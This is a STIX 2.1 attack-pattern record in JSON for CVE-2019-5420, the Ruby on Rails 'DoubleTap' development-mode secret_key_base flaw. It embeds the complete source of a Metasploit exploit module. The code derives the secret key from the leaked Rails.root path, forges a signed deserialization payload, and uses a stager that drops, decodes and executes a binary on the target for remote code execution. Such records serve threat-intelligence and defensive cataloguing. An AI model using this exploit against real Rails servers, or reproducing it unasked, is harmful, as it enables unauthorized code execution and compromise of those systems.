{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cf3bb20c-2eb8-4c23-9d01-e484bc45dbdb",
    "created": "2024-08-14T17:11:39.476885Z",
    "modified": "2024-08-14T17:11:39.476889Z",
    "name": "Ruby On Rails DoubleTap Development Mode secret_key_base Vulnerability",
    "description": " This module exploits a vulnerability in Ruby on Rails. In development mode, a Rails application would use its name as the secret_key_base, and can be easily extracted by visiting an invalid resource for a path. As a result, this allows a remote user to create and deliver a signed serialized payload, load it by the application, and gain remote code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/rails_double_tap.rb",
            "external_id": "rails_double_tap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-5420"
        },
        {
            "source_name": "reference",
            "url": "https://hackerone.com/reports/473888"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mpgn/Rails-doubletap-RCE"
        },
        {
            "source_name": "reference",
            "url": "https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2019-5420/rubyonrails-security/IsQKvDqZdKw/UYgRCJz2CgAJ"
        },
        {
            "source_name": "reference",
            "url": "https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Auxiliary::Report\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Ruby On Rails DoubleTap Development Mode secret_key_base Vulnerability',\n      'Description'    => %q{\n        This module exploits a vulnerability in Ruby on Rails. In development mode, a Rails\n        application would use its name as the secret_key_base, and can be easily extracted by\n        visiting an invalid resource for a path. As a result, this allows a remote user to\n        create and deliver a signed serialized payload, load it by the application, and gain\n        remote code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'ooooooo_q', # Reported the vuln on hackerone\n          'mpgn',      # Proof-of-Concept\n          'sinn3r'     # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2019-5420' ],\n          [ 'URL', 'https://hackerone.com/reports/473888' ],\n          [ 'URL', 'https://github.com/mpgn/Rails-doubletap-RCE' ],\n          [ 'URL', 'https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2019-5420/rubyonrails-security/IsQKvDqZdKw/UYgRCJz2CgAJ' ],\n          [ 'URL', 'https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization' ]\n        ],\n      'Platform'       => 'linux',\n      'Targets'        =>\n        [\n          [ 'Ruby on Rails 5.2 and prior', { } ]\n        ],\n      'DefaultOptions' =>\n        {\n          'RPORT' => 3000\n        },\n      'Notes'          =>\n        {\n          'AKA'         => [ 'doubletap' ],\n          'Stability'   => [ CRASH_SAFE  ],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2019-03-13',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The route for the Rails application', '/']),\n      ])\n  end\n\n  NO_RAILS_ROOT_MSG = 'No Rails.root info'\n\n  # These mocked classes are borrowed from Rails 5. I had to do this because Metasploit\n  # still uses Rails 4, and we don't really know when we will be able to upgrade it.\n\n  class Messages\n    class Metadata\n      def initialize(message, expires_at = nil, purpose = nil)\n        @message, @expires_at, @purpose = message, expires_at, purpose\n      end\n\n      def as_json(options = {})\n        { _rails: { message: @message, exp: @expires_at, pur: @purpose } }\n      end\n\n      def self.wrap(message, expires_at: nil, expires_in: nil, purpose: nil)\n        if expires_at || expires_in || purpose\n          ActiveSupport::JSON.encode new(encode(message), pick_expiry(expires_at, expires_in), purpose)\n        else\n          message\n        end\n      end\n\n      private\n\n      def self.pick_expiry(expires_at, expires_in)\n        if expires_at\n          expires_at.utc.iso8601(3)\n        elsif expires_in\n          Time.now.utc.advance(seconds: expires_in).iso8601(3)\n        end\n      end\n\n      def self.encode(message)\n        Rex::Text::encode_base64(message)\n      end\n    end\n  end\n\n  class MessageVerifier\n    def initialize(secret, options = {})\n      raise ArgumentError, 'Secret should not be nil.' unless secret\n      @secret = secret\n      @digest = options[:digest] || 'SHA1'\n      @serializer = options[:serializer] || Marshal\n    end\n\n    def generate(value, expires_at: nil, expires_in: nil, purpose: nil)\n      data = encode(Messages::Metadata.wrap(@serializer.dump(value), expires_at: expires_at, expires_in: expires_in, purpose: purpose))\n      \"#{data}--#{generate_digest(data)}\"\n    end\n\n    private\n\n    def generate_digest(data)\n      require \"openssl\" unless defined?(OpenSSL)\n      OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const_get(@digest).new, @secret, data)\n    end\n\n    def encode(message)\n      Rex::Text::encode_base64(message)\n    end\n  end\n\n  def check\n    check_code = CheckCode::Safe\n    app_name = get_application_name\n    check_code = CheckCode::Appears unless app_name.blank?\n    test_payload = %Q|puts 1|\n    rails_payload = generate_rails_payload(app_name, test_payload)\n    result = send_serialized_payload(rails_payload)\n    check_code = CheckCode::Vulnerable if result\n    check_code\n  rescue Msf::Exploit::Failed => e\n    vprint_error(e.message)\n    return check_code if e.message.to_s.include? NO_RAILS_ROOT_MSG\n    CheckCode::Unknown\n  end\n\n  # Returns information about Rails.root if we retrieve an invalid path under rails.\n  def get_rails_root_info\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, 'rails', Rex::Text.rand_text_alphanumeric(32)),\n    })\n\n    fail_with(Failure::Unknown, 'No response from the server') unless res\n    html = res.get_html_document\n    rails_root_node = html.at('//code[contains(text(), \"Rails.root:\")]')\n    fail_with(Failure::NotVulnerable, NO_RAILS_ROOT_MSG) unless rails_root_node\n    root_info_value = rails_root_node.text.scan(/Rails.root: (.+)/).flatten.first\n    report_note(host: rhost, type: 'rails.root_info', data: root_info_value, update: :unique_data)\n    root_info_value\n  end\n\n  # Returns the application name based on Rails.root. It seems in development mode, the\n  # application name is used as a secret_key_base to encrypt/decrypt data.\n  def get_application_name\n    root_info = get_rails_root_info\n    root_info.split('/').last.capitalize\n  end\n\n  # Returns the stager code that writes the payload to disk so we can execute it.\n  def get_stager_code\n    b64_fname = \"/tmp/#{Rex::Text.rand_text_alpha(6)}.bin\"\n    bin_fname = \"/tmp/#{Rex::Text.rand_text_alpha(5)}.bin\"\n    register_file_for_cleanup(b64_fname, bin_fname)\n    p = Rex::Text.encode_base64(generate_payload_exe)\n\n    c  = \"File.open('#{b64_fname}', 'wb') { |f| f.write('#{p}') }; \"\n    c << \"%x(base64 --decode #{b64_fname} > #{bin_fname}); \"\n    c << \"%x(chmod +x #{bin_fname}); \"\n    c << \"%x(#{bin_fname})\"\n    c\n  end\n\n  # Returns the serialized payload that is embedded with our malicious payload.\n  def generate_rails_payload(app_name, ruby_payload)\n    secret_key_base = Digest::MD5.hexdigest(\"#{app_name}::Application\")\n    keygen = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))\n    secret = keygen.generate_key('ActiveStorage')\n    verifier = MessageVerifier.new(secret)\n    erb = ERB.allocate\n    erb.instance_variable_set :@src, ruby_payload\n    erb.instance_variable_set :@filename, \"1\"\n    erb.instance_variable_set :@lineno, 1\n    dump_target = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)\n    verifier.generate(dump_target, purpose: :blob_key)\n  end\n\n  # Sending the serialized payload\n  # If the payload fails, the server should return 404. If successful, then 200.\n  def send_serialized_payload(rails_payload)\n    res = send_request_cgi({\n      'method'  => 'GET',\n      'uri'     => \"/rails/active_storage/disk/#{rails_payload}/test\",\n    })\n\n    if res && res.code != 200\n      print_error(\"It doesn't look like the exploit worked. Server returned: #{res.code}.\")\n      print_error('The expected response should be HTTP 200.')\n\n      # This indicates the server did not accept the payload\n      return false\n    end\n\n    # This is used to indicate the server accepted the payload\n    true\n  end\n\n  def exploit\n    print_status(\"Attempting to retrieve the application name...\")\n    app_name = get_application_name\n    print_status(\"The application name is: #{app_name}\")\n\n    stager = get_stager_code\n    print_status(\"Stager ready: #{stager.length} bytes\")\n\n    rails_payload = generate_rails_payload(app_name, stager)\n    print_status(\"Sending serialized payload to target (#{rails_payload.length} bytes)\")\n    send_serialized_payload(rails_payload)\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-03-13",
    "x_mitre_platforms": [
        "linux'"
    ]
}